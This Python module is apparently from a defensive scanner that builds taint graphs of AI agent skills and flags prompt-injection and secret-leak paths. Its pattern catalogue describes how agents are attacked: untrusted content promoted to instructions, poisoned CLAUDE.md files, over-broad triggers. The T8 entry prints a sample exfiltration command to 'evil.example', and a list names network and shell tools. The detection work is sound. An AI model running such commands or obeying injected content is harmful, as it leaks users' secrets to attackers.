"""Graph queries: candidate taint paths and secret/untrusted confluence."""

from __future__ import annotations

import networkx as nx

SINK_SEVERITY = {
    "shell_exec": 0,
    "code_eval": 0,
    "value_transfer": 0,
    "agent_config_write": 1,
    "privileged_api": 1,
    "network_egress": 2,
    "file_write": 3,
    "skill_trigger": 4,
    "context_output": 5,
}
CERTAINTY_RANK = {"deterministic": 0, "extracted": 1, "probabilistic": 2}
CONFLUENCE_SINKS = {"network_egress", "shell_exec", "code_eval", "privileged_api", "value_transfer"}
# Sinks that count as a *leak* when the source is a secret. Secrets legitimately reach network/shell
# (e.g. an Authorization header to the API the skill talks to), so those are not reported for secrets.
SECRET_SINKS = {"context_output", "file_write", "agent_config_write"}
# Agent capabilities that can carry an environment secret to an attacker-chosen place (T8).
AMBIENT_SINKS = {"shell_exec", "code_eval", "network_egress"}
# Declared binaries (frontmatter requires.bins) that give the agent a shell/network way out.
EXFIL_BINS = {"curl", "wget", "nc", "ncat", "netcat", "ssh", "scp", "rsync", "ftp", "sftp", "telnet", "httpie", "http",
              "bash", "sh", "zsh", "python", "python3", "node", "deno", "bun", "ruby", "perl", "php", "gh", "git",
              "aws", "gcloud", "az"}


# Pattern types (taxonomy of candidate shapes). "T" ids, so they are never confused with per-skill path ids p1, p2, ...
PATTERNS: dict[str, dict] = {
    "T1": {
        "name": "Direct taint flow",
        "summary": "Untrusted data reaches a sink with no decision by the agent on the way.",
        "explanation": "The data flows straight into a dangerous operation: typically the doc tells the agent to pass "
        "untrusted data (e.g. a repository file name) as a script argument, and the script hands it to the shell "
        "unsanitized. Every step is code or an explicit instruction, so it fires whenever the skill runs on "
        "attacker-controlled input.",
        "rule": "Su -> ... -> K without passing through the Agent context",
    },
    "T2": {
        "name": "Data-to-instruction promotion",
        "summary": "Untrusted content enters the agent context and a doc instruction tells the agent to act on it.",
        "explanation": "The skill turns data into commands: for example it fetches a page and says \"follow any setup "
        "steps it contains\". Whoever controls the content controls what the agent does. No code bug is needed; "
        "the vulnerable part is the instruction.",
        "rule": "Su ~> C ->p K, where K is a doc operator (e.g. follow content, a state-changing API call such as a "
        "value transfer)",
    },
    "T3": {
        "name": "LLM-mediated chaining",
        "summary": "One script's output enters the context and the agent copies a value from it into another script.",
        "explanation": "The LLM is the bridge between two scripts: it picks a value (a branch name, a title) from "
        "output it has read and passes it on. If that value is attacker-chosen and the second script uses it "
        "unsafely, the attack crosses the LLM. Static taint tools miss this because the link is not in any code.",
        "rule": "Su ~> C ->p script input ~> K (via llm_binding)",
    },
    "T4": {
        "name": "Untrusted persistent write",
        "summary": "External content is written into a file the agent auto-loads (CLAUDE.md, AGENTS.md, .cursorrules).",
        "explanation": "Whoever controls the written content controls the agent's standing instructions, not just "
        "this run but every future session in that project (persists edge back into the context).",
        "rule": "Su ~> K (agent_config_write), plus K -> C (persists)",
    },
    "T5": {
        "name": "Trigger over-breadth",
        "summary": "Untrusted content in the context can make the agent activate a skill through its broad description.",
        "explanation": "The skill's description matches too much (\"use whenever X is mentioned\"), so any page, file "
        "or issue that mentions X can start the skill without the user asking. Dangerous when the triggered skill "
        "has powerful sinks of its own.",
        "rule": "Su ~> C ->p K (skill_trigger), description breadth >= threshold",
    },
    "T6": {
        "name": "Exposure",
        "summary": "Untrusted or secret data is placed into the agent context (or a secret into a file).",
        "explanation": "A script prints data into the context (or writes a secret to a file). Nothing acts on it yet: "
        "with untrusted data it is the first half of T2/T3; with a secret it is a leak by itself (the token is now "
        "in the conversation, logs, or a shareable report). Lowest severity.",
        "rule": "(Su | Ss) ~> K (context_output) -> C, or Ss ~> K (file_write)",
    },
    "T7": {
        "name": "Secret-untrusted confluence",
        "summary": "A secret and attacker-controlled content end up in the same context, which has a way out.",
        "explanation": "Neither flow is a vulnerability alone. Together, the attacker's text can ask the agent to "
        "send the secret it can already see. Defined by two flows meeting at the context, plus an outflow "
        "(often the documented default network outflow).",
        "rule": "Ss ~> C  and  Su ~> C  and  C ->p K (network/shell)",
    },
    "T8": {
        "name": "Ambient secret exfiltration",
        "summary": "Untrusted content is in the context, the agent can use a shell or the network, and a secret sits in "
        "its environment.",
        "explanation": "The secret never has to be printed: attacker text can ask the agent to run a command such as "
        "`curl https://evil.example/?t=$TOKEN`, and the shell substitutes the value on the way out. Weaker than T7 "
        "(the agent must emit an attacker-written command) and reported only when no T7 covers the same context.",
        "rule": "Su ~> C  and  C ->p K (shell/network, or a declared network/shell binary)  and  Ss in env (not ~> C)",
    },
}


def classify_pattern(G: nx.MultiDiGraph, rec: dict) -> str:
    """Assign a pattern type to a candidate record using the shape rules in PATTERNS."""
    if rec.get("kind") == "confluence":
        return "T7"
    shape = rec["shape"]
    sink, trust = shape["sink_category"], shape.get("source_trust")
    if sink == "context_output" or (trust == "secret" and sink == "file_write"):
        return "T6"
    if sink == "skill_trigger":
        return "T5"
    if sink == "agent_config_write":
        return "T4"
    ctx = next((n for n in rec["path"] if G.nodes[n]["type"] == "AgentContext"), None)
    if ctx is not None:
        out = next((e for e in rec["edges"] if e["from"] == ctx), {})
        if out.get("via") == "llm_binding":
            return "T3"
        if out.get("via") == "default_outflow":
            return "T7"
        return "T2"
    return "T1"


def pattern_info(pid: str) -> dict:
    return {"id": pid, "name": PATTERNS[pid]["name"], "summary": PATTERNS[pid]["summary"]}


def flow_view(G: nx.MultiDiGraph) -> nx.DiGraph:
    """Flow edges only; for parallel flows keep the most certain one."""
    F = nx.DiGraph()
    F.add_nodes_from(G.nodes(data=True))
    for u, v, d in G.edges(data=True):
        if d.get("etype") != "flow":
            continue
        if F.has_edge(u, v):
            if CERTAINTY_RANK[d["certainty"]] >= CERTAINTY_RANK[F[u][v]["certainty"]]:
                continue
        F.add_edge(u, v, **d)
    return F


def _modality(G, n) -> str | None:
    return G.nodes[n].get("modality")


def _path_record(G, F, path, skill) -> dict:
    edges = []
    for u, v in zip(path, path[1:]):
        d = F[u][v]
        edges.append({"from": u, "to": v, **{k: d[k] for k in ("certainty", "via", "binds") if d.get(k) is not None}})
    mods = {_modality(G, n) for n in path} - {None}
    src, sink = G.nodes[path[0]], G.nodes[path[-1]]
    evidence = []
    for n in path:
        ev = G.nodes[n].get("evidence")
        if ev:
            evidence.append({"node": n, **ev})
    prob = sum(1 for e in edges if e["certainty"] == "probabilistic")
    return {
        "skill": skill,
        "kind": "path",
        "path": list(path),
        "path_labels": [G.nodes[n]["label"] for n in path],
        "edges": edges,
        "shape": {
            "source_category": src.get("category"),
            "source_trust": src.get("trust"),
            "sink_category": sink.get("sink_category"),
            "cross_modal": {"code", "doc"} <= mods
            or ("code" in mods and any(e.get("via") in ("llm_binding", "doc_instruction") for e in edges)),
            "probabilistic_edges": prob,
            "code_involved": "code" in mods,
            "via_agent_context": any(G.nodes[n]["type"] == "AgentContext" for n in path),
            "uses_defaults": any(G.nodes[n].get("default") for n in path),
        },
        "severity": SINK_SEVERITY.get(sink.get("sink_category"), 9),
        "evidence": evidence,
        "status": "candidate",
    }


def _context_after(G, F, sink) -> str | None:
    """The AgentContext a context_output sink feeds, so exposure paths end at the context itself."""
    if G.nodes[sink].get("sink_category") != "context_output":
        return None
    return next((v for v in F.successors(sink) if G.nodes[v]["type"] == "AgentContext"), None)


def candidate_paths(G: nx.MultiDiGraph, max_len: int = 8, best_per_pair: bool = True) -> list[dict]:
    """Source -> sink Operator over flow edges, no sanitizer on the path.

    * untrusted sources: any sink (injection-style paths);
    * secret sources: only leak sinks in ``SECRET_SINKS`` (exposure-style paths).
    Paths ending at a ``context_output`` sink are extended by one hop to the AgentContext.
    """
    F = flow_view(G)
    skill = G.graph.get("skill")
    sources = [n for n, d in G.nodes(data=True) if d["type"] == "Source" and d.get("trust") in ("untrusted", "secret")]
    sinks = [n for n, d in G.nodes(data=True) if d["type"] == "Operator" and d.get("role") == "sink"]
    out = []
    for s in sources:
        secret = G.nodes[s].get("trust") == "secret"
        for t in sinks:
            if secret and G.nodes[t].get("sink_category") not in SECRET_SINKS:
                continue
            if s == t or not nx.has_path(F, s, t):
                continue
            found = []
            for p in nx.all_simple_paths(F, s, t, cutoff=max_len):
                if any(G.nodes[n].get("role") == "sanitizer" for n in p):
                    continue
                prob = sum(1 for u, v in zip(p, p[1:]) if F[u][v]["certainty"] == "probabilistic")
                found.append((prob, len(p), p))
            if not found:
                continue
            found.sort(key=lambda x: (x[0], x[1], x[2]))
            for _, _, p in found[:1] if best_per_pair else found:
                ctx = _context_after(G, F, p[-1])
                rec = _path_record(G, F, p + [ctx] if ctx else p, skill)
                if ctx:  # severity/sink come from the sink, not the trailing context node
                    rec["shape"]["sink_category"] = G.nodes[p[-1]].get("sink_category")
                    rec["severity"] = SINK_SEVERITY["context_output"]
                    rec["shape"]["via_agent_context"] = True
                out.append(rec)
    out.sort(key=lambda r: (r["severity"], r["shape"]["probabilistic_edges"], len(r["path"]), r["path"]))
    for i, r in enumerate(out, 1):
        r["id"] = f"p{i}"
        r["pattern"] = pattern_info(classify_pattern(G, r))
    return out


def confluence(G: nx.MultiDiGraph) -> list[dict]:
    """AgentContext holds secret AND untrusted data and has a probabilistic outflow to network/shell."""
    out = []
    for c, d in G.nodes(data=True):
        if d["type"] != "AgentContext" or not (d.get("holds_secret") and d.get("holds_untrusted")):
            continue
        outflows = []
        for _, v, e in G.out_edges(c, data=True):
            vd = G.nodes[v]
            if e.get("etype") == "flow" and e.get("certainty") == "probabilistic" and vd.get("sink_category") in CONFLUENCE_SINKS:
                outflows.append({"node": v, "label": vd["label"], "sink_category": vd["sink_category"],
                                 "default": bool(vd.get("default"))})
        if not outflows:
            continue
        srcs = d.get("label_sources", [])
        secret = [s for s in srcs if G.nodes[s].get("trust") == "secret"]
        untrusted = [s for s in srcs if G.nodes[s].get("trust") == "untrusted"]
        evidence = [{"node": s, **G.nodes[s]["evidence"]} for s in secret + untrusted if G.nodes[s].get("evidence")]
        out.append({
            "skill": G.graph.get("skill"),
            "id": f"c{len(out) + 1}",
            "kind": "confluence",
            "context": c,
            "secret_sources": secret,
            "untrusted_sources": untrusted,
            "outflows": outflows,
            "path": [*secret, *untrusted, c, *(o["node"] for o in outflows)],
            "pattern": pattern_info("T7"),
            "evidence": evidence,
            "status": "candidate",
        })
    return out


def ambient_secrets(G: nx.MultiDiGraph, conf: list[dict] | None = None) -> list[dict]:
    """T8: AgentContext holds untrusted data, the agent has a shell/network capability, and an environment secret
    is reachable by its commands without being in the context. Skipped where a T7 confluence already covers the
    context (T7 implies it)."""
    conf = confluence(G) if conf is None else conf
    covered = {c["context"] for c in conf}
    secrets = [n for n, d in G.nodes(data=True)
               if d["type"] == "Source" and d.get("trust") == "secret" and d.get("found_in") == "environment"]
    bins = sorted(b for b in G.graph.get("declared_bins", []) if b.lower() in EXFIL_BINS)
    out = []
    for c, d in G.nodes(data=True):
        if d["type"] != "AgentContext" or c in covered or not d.get("holds_untrusted") or not secrets:
            continue
        caps = []
        for _, v, e in G.out_edges(c, data=True):
            vd = G.nodes[v]
            if e.get("etype") == "flow" and vd.get("sink_category") in AMBIENT_SINKS:
                caps.append({"node": v, "label": vd["label"], "sink_category": vd["sink_category"]})
        caps += [{"node": None, "label": f"declared binary: {b}", "sink_category": "declared_bin"} for b in bins]
        if not caps:
            continue
        untrusted = [s for s in d.get("label_sources", []) if G.nodes[s].get("trust") == "untrusted"]
        evidence = [{"node": s, **G.nodes[s]["evidence"]} for s in secrets + untrusted if G.nodes[s].get("evidence")]
        out.append({
            "skill": G.graph.get("skill"),
            "id": f"a{len(out) + 1}",
            "kind": "ambient_secret",
            "context": c,
            "secret_sources": secrets,
            "secret_labels": [G.nodes[s]["label"] for s in secrets],
            "untrusted_sources": untrusted,
            "capabilities": caps,
            "path": [*untrusted, c, *(x["node"] for x in caps if x["node"]), *secrets],
            "pattern": pattern_info("T8"),
            "evidence": evidence,
            "status": "candidate",
        })
    return out


def run_queries(G: nx.MultiDiGraph, max_len: int = 8) -> dict:
    conf = confluence(G)
    return {
        "skill": G.graph.get("skill"),
        "candidates": candidate_paths(G, max_len),
        "confluence": conf,
        "ambient_secrets": ambient_secrets(G, conf),
        "pattern_catalog": PATTERNS,
        "binding_errors": G.graph.get("binding_errors", []),
        "rejected_records": G.graph.get("rejected_records", []),
        "warnings": G.graph.get("warnings", []),
    }
